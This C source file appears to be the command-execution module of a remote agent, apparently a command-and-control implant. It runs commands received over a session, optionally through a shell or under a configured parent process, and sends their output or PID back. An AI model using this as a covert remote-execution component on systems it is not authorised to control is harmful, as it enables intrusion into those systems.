#include <stdint.h>
#include <string.h>
#include "cJSON.h"
#include "agent_utility.h"
#include "agent_session.h"
#include "agent_protocol.h"
#include "agent_config.h"
#include "agent_process.h"
#include "agent_commands.h"
#include "agent_session.h"

// this method is windows dependent and accepts a program_run_info*
extern uint32_t send_process_output(void* args);
extern bool verify_program_termination(process_intercepted* proc);

static uint32_t send_command_output(void* args) {
	char* payload = ZERO(char);
	uint32_t error_code = ERROR_OK;
	program_run_info* info = (program_run_info*)args;	
	DECLARE_RESULT_WITH_FEEDBACK(error);

	// this cloning is necessary since the pck is freed in the send_process_output function
	packet* pck = message_clone_packet(info->pck);
	if (!pck) goto fail;

	// run the thread to send the process output
	session_start_thread(send_process_output, args, info->sess);

	wait_for_process_termination(info->process_intercepted);

	SET_RESULT_SUCCESS(error);
	payload = serialize_command_result(error);
	if (payload) message_send_command_result(info->sess, pck, payload);
	FREE(payload);
	FREE_RESULT(error);
exit:
	return error_code;

fail:
	error_code = ERROR_UNKNOWN;
	goto exit;
}

command_result* cmd_exec_program(session* sess, packet* pck) {
	DECLARE_RESULT_WITH_FEEDBACK(error);
	uint32_t error_code = ERROR_OK;
	cJSON* jpck = ZERO(cJSON);
	char* parent_program = ZERO(char);
	char* command = ZERO(char);
	size_t command_size = 0;
	process_handle* process = ZERO(process_handle);
	program_run_info* info = ZERO(program_run_info);

	jpck = convert_to_JSON(pck);
	if (!jpck) goto fail;

	cJSON* jcommand = cJSON_GetObjectItem(jpck, EXEC_COMMAND);
	cJSON* juse_shell = cJSON_GetObjectItem(jpck, EXEC_USE_SHELL);
	cJSON* jbackground = cJSON_GetObjectItem(jpck, EXEC_RUN_BACKGROUND);
	if (!jcommand || !juse_shell || !jbackground) goto fail;

	cJSON* jsession = cJSON_GetObjectItem(sess->config, CONFIG_SESSION);
	if (!jsession) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}

	// read the parent process to use if any
	cJSON* jexec = cJSON_GetObjectItem(jsession, CONFIG_SESSION_EXEC);
	if (!jexec) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}

	cJSON* jProcessParent = cJSON_GetObjectItemCaseSensitive(jexec, CONFIG_SESSION_PROCESSPARENT);
	if (jProcessParent)
		parent_program = jProcessParent->valuestring;

	process = OBJ_ALLOC(process_handle);
	if (!process) goto fail;

	if (juse_shell->valueint) {
		// run the command asa command shell
		cJSON* jshell = cJSON_GetObjectItem(jsession, CONFIG_SESSION_SHELL);
		if (!jshell) {
			error->error_code = ERROR_JSON_CONVERSION;
			goto fail;
		}

		// create the command string
		command_size = strlen(jshell->valuestring);
		command_size += strlen(jcommand->valuestring);
		command_size += 64;
		command = MEM_ALLOC(command_size);
		strcat_s(command, command_size, jshell->valuestring);
		strcat_s(command, command_size, " ");
		strcat_s(command, command_size, jcommand->valuestring);
		strcat_s(command, command_size, " & ");
		strcat_s(command, command_size, " exit ");
	}
	else {
		// run the command directly (no command-shell)
		command = _strdup(jcommand->valuestring);
	}

	// run the process
	error_code = process_run(ZERO(char), command, parent_program, process);
	if (!process) goto fail;
	error->error_code = error_code;
	if (SUCCESS(error_code)) SET_RESULT_SUCCESS(error);

	if (jbackground->valueint) {
		// run it in background, send the process ID as result
		if (!juse_shell->valueint) {
			// if the process is not executed through a shell then send the process ID
			char pid[_MAX_U64TOSTR_BASE2_COUNT] = { 0 };
			_itoa_s(process->pid, pid, _countof(pid), 10);
			message_send_data(sess, pck, strlen(pid), (uint8_t*)pid);
		}		
		process_free(process, false);
	}
	else {
		error->send_result = false;

		// need to send the output
		info = OBJ_ALLOC(program_run_info);
		if (!info) goto fail;
		info->sess = sess;
		info->pck = message_clone_packet(pck);
		info->process_intercepted = OBJ_ALLOC(process_intercepted);
		if (!info->process_intercepted) goto fail;
		info->process_intercepted->process = process;

		session_start_thread(send_command_output, (void*)info, info->sess);

		SET_RESULT_SUCCESS(error);
	}

exit:
	FREE(command);	
	return error;

fail:
	cJSON_Delete(jpck);
	process_free(process, false);
	goto exit;
}